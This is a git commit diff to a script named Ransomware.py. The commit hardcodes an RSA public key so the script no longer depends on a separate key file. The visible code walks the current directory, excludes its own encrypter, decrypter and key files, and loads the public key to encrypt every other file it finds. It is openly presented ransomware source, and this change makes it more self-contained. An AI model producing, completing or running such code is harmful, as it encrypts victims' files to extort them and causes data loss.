046723432b90401caf0955aea37ebbde60ce9375
IsaacParle <119637788+IsaacParle@users.noreply.github.com>
2023-05-22 18:35:27 -0500

    Update Ransomware.py
    Added public_key_pem to the script to eliminate the need for the script to reference an additonal file

--- Ransomware.py
+++ Ransomware.py
@@ -1,6 +1,17 @@
 import os
 import rsa
 
+
+public_key_pem = """
+-----BEGIN RSA PUBLIC KEY-----
+MIIBCgKCAQEAgcoWsUdseU21eqiUDDuv3yReCOwyaX5F95nEr0dBqgbnV3wAUdCB
+8FopjKtopEGVUR412i+s2O+hp5ZTPfo9XxJB8hj2IIIhyxHNcrPdxGTbNQSkxkDB
+d5q55kI+SoYDoyG7/QUZBuDvCvSCm01NC+r2guT8fpMqQCeu0S++l3QA0FFD8mdb
+AM0mBkkgtU4wh84rvqTik2rJuJqXh7fEbNXS1d+LiVXwBrm7LxKR1WuOpXCjoB6I
+126d34iud2cBOOUlOGK1DnIIUeKBVjc6XXYtZz+JWjoiobaETBpA94i8W3htDL/W
+btJqj6xc3SZpaGhFJiEnfaCSGZmWGEwufQIDAQAB
+-----END RSA PUBLIC KEY-----"""
+
 files = [] 
 for file in os.listdir():
     if file == "ransom_fixer.py" or file == "decrypter.py" or file == "encrypter.py" or file == "key_generator.py" or file == "private.pem" or file == "public.pem" or file == "ransom.py":
@@ -10,8 +21,7 @@ for file in os.listdir():
 print(files)
 
 for file in files:
-    with open("public.pem", 'rb') as f:
-        public_key = rsa.PublicKey.load_pkcs1(f.read())
+    public_key = rsa.PublicKey.load_pkcs1(public_key_pem.encode())
 
     with open(file, 'rb') as f:
         data = f.read()
